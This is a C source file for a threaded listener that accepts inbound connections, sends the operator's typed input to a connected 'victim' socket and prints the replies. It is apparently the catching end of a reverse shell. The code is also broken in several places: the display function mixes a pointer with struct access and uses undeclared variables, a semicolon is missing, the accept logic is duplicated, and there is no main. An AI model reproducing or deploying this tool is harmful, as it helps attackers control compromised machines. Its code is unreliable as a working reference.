#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <errno.h>
#define MAXBUF 65536
#define BACKLOG 1


fd_set readfds;
int master_socket, new_socket , client_socket[30] , max_clients = 30 , activity, i, sd;
int max_sd;
struct sockaddr_in cli;
socklen_t len;

// Declaration of struct "args" as the pthread_create function preferably takes a struct as a param
// This is the struct for the Writer thread
typedef struct args
{
	int src;
	int dest;
} args;

// Declaration of a thread routine that will be called by pthread for reading from stdin on server and write to the victim file descriptor

void *Acceptor(void *arg){

	// assigned master socket to the set
	FD_SET(master_socket, &readfds);

	// sets array of socket fds to zero so not read 
	for (i = 0; i < max_clients; i++) 
	{
		client_socket[i] = 0;
	}

	while(1){	
		FD_ZERO(&readfds);
		FD_SET(master_socket, &readfds);
		max_sd = master_socket;

		//add child sockets to set
		for ( i = 0 ; i < max_clients ; i++){
			//socket descriptor
			sd = client_socket[i];

			//if valid socket descriptor then add to read list
			if(sd > 0)
				FD_SET( sd , &readfds);

			//highest file descriptor number, need it for the select function
			if(sd > max_sd)
				max_sd = sd;	  
		}


		//wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
		activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);

		if ((activity < 0) && (errno!=EINTR)) {

			;;

		}

		if (FD_ISSET(master_socket, &readfds)) {



			//wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
			activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);

			if ((activity < 0) && (errno!=EINTR)) {

				;;	

			}

			if (FD_ISSET(master_socket, &readfds)) {

				if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){

					perror("accept");
					exit(EXIT_FAILURE);

				}
				// add new socket to an array of sockets

				for (i = 0; i < max_clients; i++) {

					// only if position is empty
					if( client_socket[i] == 0 ){

						client_socket[i] = new_socket;
						getpeername(new_socket, (struct sockaddr *)&cli, &len);
						printf("Connection received with %s\n\n", inet_ntoa(cli.sin_addr));

						break;
					}
				}
			}
		}
	}
}


void *Writer(void *arg)
{

	args a = *(args *)arg;
	int n;
	char buffer[MAXBUF];

	while ((n = read(a.src, buffer, MAXBUF - 1)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
	{	
		write(a.dest, buffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 123
	}

	if (n == -1)
	{
		printf("Error in function thread read()\n");
	}

	return NULL;
}

int CreateServerSocket(char *address, char *port, int *type, int *family)
{
	int sockfd, gai_error;
	struct addrinfo hints, *servinfo, *p;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = *family;   // passes parameters called into a struct
	hints.ai_socktype = *type;
	hints.ai_flags = AI_PASSIVE;

	if ((gai_error = getaddrinfo(address, port, &hints, &servinfo)) != 0)
	{
		fprintf(stderr, "Error in getaddrinfo(): %s\n", gai_strerror(gai_error));
		exit(0);
	}

	for (p = servinfo; p != NULL; p = p->ai_next)
	{
		sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);

		if (sockfd == -1)
		{
			perror("Error in socket()");
			continue;
		}

		if (*type == SOCK_STREAM)
		{
			int sockopt = setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));

			if (sockopt == -1)
			{
				printf("Error in function setsockopt\n");
			}
		}

		// binds socket
		if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1)
		{
			close(sockfd);
			perror("Error in bind()");
			continue;
		}

		break;
	}

	if (p == NULL)
	{
		printf("Error could not bind\n");
		exit(0);
	}

	// starts listening for incoming connections
	if (*type == SOCK_STREAM && listen(sockfd, BACKLOG) == -1)
	{
		printf("Error in function listen\n");
	}

	freeaddrinfo(servinfo);
	printf("Listener started... awaiting connection\n\n");
	return sockfd;
}

void connection_display(args *a) {
    n = read(a.dest, buffer, MAXBUF);
    write(STDOUT_FILENO, buffer, n);
    while ((n = read(a.dest, buffer, MAXBUF)) > 0)
    {

        if (write(STDOUT_FILENO, buffer, n) == -1)  // writes data from victim fd to stdout
        {
            printf("Error in function write()\n");
        }
    }

    if (n == -1)
    {
        printf("Error in function read()\n");
    }
}

void Server(char *address, char *port, int *type, int *family)
{
	args a;
	int n;
	char buffer[MAXBUF];
	pthread_t printer;
	pthread_t acceptor;

	// calls function to create server socket then returns server file descriptor
	master_socket = CreateServerSocket(address, port, type, family);

	// create an acceptor child process to accept incoming connections

	if (pthread_create(&acceptor, NULL, Acceptor, (void *)&a) != 0)
	{
		printf("Error in function pthread_create\n");
	}

	// waits for the first socket to be filled
	while(client_socket[0] == 0){
		;;
	}

	// Passes arguments to the thread struct
	a.src = STDIN_FILENO;
	a.dest = client_socket[0];

	// creates thread that will run parallel with the rest of the code to handle connection operations
	if (pthread_create(&printer, NULL, Writer, (void *)&a) != 0)
	{
		printf("Error in function pthread_create\n");
	}

	// reads data from the victim socket, executes code is data is found
    connection_display(&a)

	// sends a request to stop thread
	pthread_cancel(printer);
	pthread_join(printer, NULL);
	close(master_socket);
	close(a.dest);
}


